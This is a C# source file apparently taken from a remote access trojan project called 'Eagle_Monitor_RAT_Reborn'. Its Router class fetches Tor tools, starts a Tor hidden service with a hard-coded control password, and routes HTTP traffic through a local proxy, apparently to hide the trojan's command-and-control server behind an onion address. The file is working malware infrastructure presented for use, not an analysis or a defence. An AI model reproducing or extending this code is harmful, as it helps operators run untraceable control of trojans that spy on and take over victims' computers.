using Bridge;
using dnlib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class Router
    {
        internal static TorSharpProxy proxy;
        private static HttpClient httpClient;
        internal static bool Alive = false;

        internal static async Task<bool> StartProxy()
        {
            if (Program.settings.torRouting)
            {
                if (!Alive)
                {
                    await Proxify(Program.settings.torPort);
                    do { Thread.Sleep(2000); }
                    while (!Alive);
                }
            }
            return Alive;
        }
        private static async Task Proxify(int port)
        {
            string _ = $"{port} 127.0.0.1:{port}";
            var settings = new TorSharpSettings
            {
                ZippedToolsDirectory = Path.Combine(Directory.GetCurrentDirectory(), "TORFiles\\TorZipped"),
                ExtractedToolsDirectory = Path.Combine(Directory.GetCurrentDirectory(), "TORFiles\\TorExtracted"),
                PrivoxySettings = { Port = 13000 },
                TorSettings =
                {
                    SpinUpServer = true,
                    HiddenServiceDir = "HiddenService",
                    HiddenServicePort = _,
                    //SocksPort = 9899,
                    HttpTunnelPort = 41000,
                    ControlPort = 42000,
                 // ORPort = "9003",
                    ControlPassword = "foobar",
                },
            };
            // download tools
            await new TorSharpToolFetcher(settings, new HttpClient()).FetchAsync();

            // execute
            proxy = new TorSharpProxy(settings);

            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy(new Uri("http://localhost:" + settings.PrivoxySettings.Port))
            };
            httpClient = new HttpClient(handler);
            await proxy.ConfigureAndStartAsync();
            // Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
            // await proxy.GetNewIdentityAsync();
            //Console.WriteLine(await httpClient.GetStringAsync("http://api.ipify.org"));
            Alive = true;
            // proxy.Stop();
        }
    }
}
